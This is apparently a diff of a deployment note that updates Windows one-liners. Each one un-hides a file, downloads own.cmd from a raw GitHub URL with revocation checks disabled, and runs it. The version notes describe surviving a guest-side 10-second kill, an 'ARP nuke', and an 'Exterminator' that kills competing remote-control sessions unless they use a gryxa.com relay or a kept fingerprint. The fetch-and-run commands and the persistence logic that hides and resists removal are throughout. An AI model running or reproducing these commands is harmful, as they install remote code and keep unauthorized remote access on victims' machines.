@@ -1,8 +1,8 @@
-UNIVERSAL DEPLOY (O46 / M32 / L22 ? detached install, 10s-kill safe):
+UNIVERSAL DEPLOY (O47 / M33 / L26 — Gryxa FP 36e506ff pinned; allow by gryxa.com relay OR keeper FP):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o46" & findstr /C:"OWN BUILD 20260802O46" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o47" & findstr /C:"OWN BUILD 20260802O47" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 SHA-pin:
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/a068e8f9a1acda35c440d108987e8291e38877b2/own.txt" & findstr /C:"OWN BUILD 20260802O46" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt" & findstr /C:"OWN BUILD 20260802O47" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-O46: stuck Gryxa no longer uses /fa. ARP nuke + detached msiexec /i survives the Guest 10s kill; next tick confirms Running.
+O47: FP rotated to 36e506ff016b2151 across own/own_mon/own_secure. Exterminator + foreign counter allow any SC whose relay is gryxa.com OR whose FP is a keeper — new Gryxa is no longer killed on connect.
